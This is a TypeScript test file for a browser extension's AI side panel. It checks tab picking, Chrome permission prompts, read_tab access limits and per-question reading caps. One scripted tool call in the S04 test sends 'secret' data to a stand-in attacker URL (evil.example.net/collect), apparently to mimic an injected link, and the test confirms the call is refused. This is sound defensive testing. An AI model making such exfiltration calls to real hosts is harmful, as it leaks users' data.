// Adding tabs on other sites to a conversation from the page picker, and the AI reading them with
// read_tab, as a user meets it in the side panel: the whole panel runs (see panel.ts), and the
// tests only type, click, and read what is on screen, besides what the model was sent and what
// was read from the tabs.
import '@testing-library/jest-dom/vitest'
import { screen, within } from '@testing-library/react'
import userEvent, { type UserEvent } from '@testing-library/user-event'
import { afterEach, describe, expect, it } from 'vitest'
import { DATA_LINE } from '../src/tools/shared'
import { FakeNotionTab, webPage } from './notion-tab'
import { closeBrowser, FakeBrowser } from './panel'

afterEach(closeBrowser)

const HERE = 'https://blog.example.com/today'
const RIVERS = 'https://news.example.com/2026/rivers?ref=home'
const LAKES = 'https://news.example.com/2026/lakes'
const SHOP = 'https://shop.example.org/item/7'
const NEWS = 'https://news.example.com/*'

/**
 * The side panel open on a blog post, in a window that also shows two news articles, a shop's page,
 * and Chrome's settings; another window shows a page on another site. Notico may read the news site.
 */
async function openPanel(setUp?: (tab: FakeNotionTab) => void) {
  const tab = new FakeNotionTab(HERE)
  tab.title = 'Today | Blog'
  tab.otherTabs = [
    { url: RIVERS, title: 'Rivers | News', dom: webPage({ title: 'Rivers | News', main: 'Rivers are rising.' }) },
    { url: LAKES, title: 'Lakes | News', dom: webPage({ title: 'Lakes | News', main: 'Lakes are calm.' }) },
    { url: SHOP, title: 'Kettle', dom: webPage({ title: 'Kettle', main: 'A kettle, 30 euros.' }) },
    { url: 'chrome://settings/', title: 'Settings' },
    { url: 'https://mail.example.net/inbox', title: 'Inbox', windowId: 2 },
  ]
  tab.allowed.add(NEWS)
  setUp?.(tab)
  const browser = await FakeBrowser.start(tab, { signedInAs: 'user_alice' })
  await browser.openPanel()
  return { browser, tab, user: userEvent.setup() }
}

const composer = () => screen.getByRole('textbox', { name: 'Message' })
const conversation = () => within(screen.getByRole('main'))
const picker = () => screen.queryByRole('listbox', { name: 'Pages' })
/** The options the picker lists in `group`, as their text: the title, then the site. */
const listed = (group: string) =>
  within(within(picker()!).getByRole('group', { name: group }))
    .getAllByRole('option')
    .map((o) => o.textContent)
/** The pages and tabs the composer will send the question with, as their titles. */
const toSend = () =>
  within(screen.getByRole('list', { name: 'Pages to send' }))
    .queryAllByRole('listitem')
    .map((li) => li.textContent)
const answered = () => screen.findByRole('button', { name: 'Send' })
const sentQuestions = (browser: FakeBrowser) =>
  browser
    .sentToModel()
    .filter((m) => m.role === 'user')
    .map((m) => m.content)
/** What the model was sent as the results of the tools it called. */
const toolResults = (browser: FakeBrowser) =>
  browser
    .sentToModel()
    .filter((m) => m.role === 'tool')
    .map((m) => m.content)
/** The lists of pages the conversation's questions went with, each as the titles it shows. */
const pagesSent = () =>
  conversation()
    .queryAllByRole('list', { name: 'Pages sent' })
    .map((list) =>
      within(list)
        .getAllByRole('listitem')
        .map((li) => li.textContent),
    )

/** Picks the tab whose title starts with `title` from the "+" picker. */
async function addTab(user: UserEvent, title: string) {
  await user.click(screen.getByRole('button', { name: 'Add a page or tab' }))
  await user.click(screen.getByRole('menuitem', { name: 'Add a page or tab…' }))
  await user.click(await screen.findByRole('option', { name: new RegExp(`^${title}`) }))
}

async function ask(user: UserEvent, question: string) {
  await user.type(composer(), question)
  await user.click(screen.getByRole('button', { name: 'Send' }))
}

const readTab = (url: string) => ({ toolCalls: [{ name: 'read_tab', arguments: JSON.stringify({ url }) }] })

/** The result read_tab gives for a page on news.example.com, as the model gets it. */
const tabResult = (title: string, url: string, text: string) =>
  [
    DATA_LINE,
    `Page in a tab the user added, on news.example.com: ${JSON.stringify({ title, url })}`,
    'Text:',
    text,
  ].join('\n')

const NOT_ADDED =
  'The user did not add a tab with this URL to this chat, so it was not read: read_tab reads only the tabs the ' +
  'notes list as added. Ask the user to add the tab, with "+" or @ in the message box.'

const GONE =
  'No tab in this window shows this URL any more: the user closed the tab or it went to another page, so ' +
  'nothing was read. Ask them to open the page and add its tab again.'

describe('UC-NOTICO-CHAT-005 add open tabs to a conversation', () => {
  it("[UC-NOTICO-CHAT-005-S01] the picker lists the window's tabs on other sites, filtered by what is typed, and reads nothing of them", async () => {
    const { browser, user } = await openPanel()

    await user.type(composer(), '@')
    await screen.findByRole('group', { name: 'Other sites' })
    // The current tab too; not Chrome's settings, nor the other window's tab.
    expect(listed('Other sites')).toEqual([
      'Today | Blogblog.example.com',
      'Rivers | Newsnews.example.com',
      'Lakes | Newsnews.example.com',
      'Kettleshop.example.org',
    ])

    // By title, or by site.
    await user.type(composer(), 'lak')
    expect(listed('Other sites')).toEqual(['Lakes | Newsnews.example.com'])
    await user.clear(composer())
    await user.type(composer(), '@shop')
    expect(listed('Other sites')).toEqual(['Kettleshop.example.org'])

    expect(browser.tab.injections).toEqual([])
    expect(browser.tab.accessRequests).toEqual([])
  })

  it('[UC-NOTICO-CHAT-005-S02] picking a tab on a site Notico may not read asks Chrome first, and adds it only once allowed', async () => {
    const { browser, user } = await openPanel()

    // Already allowed: added without asking.
    await addTab(user, 'Rivers')
    expect(toSend()).toEqual(['Rivers | News'])
    expect(browser.tab.accessRequests).toEqual([])

    await addTab(user, 'Kettle')
    expect(toSend()).toEqual(['Rivers | News', 'Kettle'])
    expect(browser.tab.accessRequests).toEqual([['https://shop.example.org/*']])
    expect(browser.tab.allowed.has('https://shop.example.org/*')).toBe(true)
  })

  it('[UC-NOTICO-CHAT-005-S02] a tab whose site the user refuses in Chrome is not added, and the picker says why', async () => {
    const { browser, user } = await openPanel((tab) => (tab.promptAnswer = false))

    // Picked with the keys this time: Chrome takes a key press as it takes a click.
    await user.type(composer(), '@kett')
    await screen.findByRole('option', { name: /^Kettle/ })
    await user.keyboard('{Enter}')

    expect(await within(picker()!.parentElement!.parentElement!).findByRole('status')).toHaveTextContent(
      'Notico may not read shop.example.org, so its tab wasn’t added.',
    )
    expect(browser.tab.accessRequests).toEqual([['https://shop.example.org/*']])
    expect(screen.queryByRole('list', { name: 'Pages to send' })).toBeNull()
    expect(browser.tab.injections).toEqual([])
  })

  it('[UC-NOTICO-CHAT-005-S03] a question carries the titles and addresses of the tabs added, shows them, and reads nothing ahead', async () => {
    const { browser, tab, user } = await openPanel()
    browser.ai.script.push({ reply: 'They differ.' })

    await addTab(user, 'Rivers')
    await addTab(user, 'Lakes')
    await ask(user, 'Compare these')
    await screen.findByText('They differ.')
    await answered()

    expect(sentQuestions(browser)).toEqual([
      '[The current tab is not a Notion page.]\n' +
        '[Tabs on other sites the user added to this question, read with read_tab: ' +
        `"Rivers | News", ${RIVERS}; "Lakes | News", ${LAKES}]\n\n` +
        'Compare these',
    ])
    expect(tab.injections).toEqual([])
    expect(pagesSent()).toEqual([['Rivers | News', 'Lakes | News']])
    // The next question starts without them.
    expect(screen.queryByRole('list', { name: 'Pages to send' })).toBeNull()

    // A tab still open is gone to; one that shows the page no more is opened again.
    await user.click(
      within(conversation().getByRole('list', { name: 'Pages sent' })).getByRole('link', { name: 'Lakes | News' }),
    )
    expect(tab.url).toBe(LAKES)
    tab.otherTabs[0].url = 'https://news.example.com/2026/front'
    await user.click(
      within(conversation().getByRole('list', { name: 'Pages sent' })).getByRole('link', { name: 'Rivers | News' }),
    )
    expect(browser.openedTabs).toEqual([RIVERS])

    await browser.openPanel()
    await user.click(screen.getByRole('button', { name: 'Chats' }))
    await user.click(
      await within(screen.getByRole('dialog', { name: 'Chats' })).findByRole('button', { name: /^Compare these/ }),
    )
    await conversation().findByText('Compare these')
    expect(pagesSent()).toEqual([['Rivers | News', 'Lakes | News']])
  })

  it('[UC-NOTICO-CHAT-005-S04] the AI reads a tab added to the chat, also in a later question, and no address the user did not add', async () => {
    const { browser, tab, user } = await openPanel((t) => t.allowed.add('https://shop.example.org/*'))
    browser.ai.script.push(
      readTab(RIVERS),
      { reply: 'Rivers are rising.' },
      readTab(RIVERS),
      // Open in the window, on a site Notico may read, but never added; and a link from a page.
      readTab(SHOP),
      readTab('https://evil.example.net/collect?d=secret'),
      { reply: 'Still rising.' },
    )

    await addTab(user, 'Rivers')
    await ask(user, 'What does this say?')
    await screen.findByText('Rivers are rising.')
    await answered()
    await ask(user, 'And now? Also check the shop')
    await screen.findByText('Still rising.')

    expect(toolResults(browser)).toEqual([
      tabResult('Rivers | News', RIVERS, 'Rivers are rising.'),
      tabResult('Rivers | News', RIVERS, 'Rivers are rising.'),
      NOT_ADDED,
      NOT_ADDED,
    ])
    // The added tab only, in the tab itself, never the current one.
    expect(tab.injections).toEqual([
      { tabId: 20, world: 'ISOLATED' },
      { tabId: 20, world: 'ISOLATED' },
    ])
  })

  it('[UC-NOTICO-CHAT-005-S05] a tab added that was closed or went to another page is not read', async () => {
    const { browser, tab, user } = await openPanel()
    browser.ai.script.push(readTab(RIVERS), readTab(LAKES), { reply: 'They are gone.' })

    await addTab(user, 'Rivers')
    await addTab(user, 'Lakes')
    tab.otherTabs[0].url = 'https://news.example.com/2026/front'
    tab.otherTabs.splice(1, 1)
    await ask(user, 'Compare these')
    await screen.findByText('They are gone.')

    expect(toolResults(browser)).toEqual([GONE, GONE])
    expect(tab.injections).toEqual([])
  })

  it("[UC-NOTICO-CHAT-005-S06] tabs read in one question share the question's limit on content from other sites", async () => {
    const long = (title: string, c: string) => ({ title, dom: webPage({ title, main: c.repeat(25_000) }) })
    const { browser, tab, user } = await openPanel((t) => {
      Object.assign(t.otherTabs[0], long('Rivers | News', 'r'))
      Object.assign(t.otherTabs[1], long('Lakes | News', 'l'))
    })
    browser.ai.script.push(readTab(RIVERS), readTab(LAKES), readTab(RIVERS), readTab(LAKES), { reply: 'Enough.' })

    await addTab(user, 'Rivers')
    await addTab(user, 'Lakes')
    await ask(user, 'Compare these, twice')
    await screen.findByText('Enough.')

    const results = toolResults(browser)
    expect(results.slice(0, 3).map((r) => r?.split('\n').at(-1)?.length)).toEqual([20_000, 20_000, 20_000])
    expect(results[3]).toBe(
      "This question has read as much from pages outside Notion as one question may (60,000 characters). Answer from what was read; don't read the page again in this question.",
    )
    expect(tab.injections).toHaveLength(3)
  })
})
